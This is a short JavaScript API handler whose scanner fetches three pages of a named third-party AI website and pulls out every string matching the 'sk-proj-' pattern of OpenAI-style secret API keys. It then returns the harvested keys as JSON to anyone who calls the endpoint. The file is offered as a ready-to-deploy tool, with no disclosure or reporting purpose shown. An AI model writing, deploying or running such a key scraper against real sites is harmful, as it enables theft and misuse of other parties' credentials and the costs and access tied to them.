import axios from "axios";
class Scanner {
  async scan() {
    const base = "https://overchat.ai";
    const paths = ["/image/ghibli", "/math/math-ai", "/image/image-summarizer"];
    const allKeys = [];
    for (const path of paths) {
      try {
        const {
          data
        } = await axios.get(base + path);
        const regex = /sk-proj-[A-Za-z0-9_\-]{80,}/g;
        for (const m of data.matchAll(regex)) {
          allKeys.push(m[0]);
        }
      } catch {}
    }
    return allKeys;
  }
}
export default async function handler(req, res) {
  try {
    const api = new Scanner();
    const result = await api.scan();
    return res.status(200).json({
      result: result
    });
  } catch (error) {
    res.status(500).json({
      error: error.message || "Internal Server Error"
    });
  }
}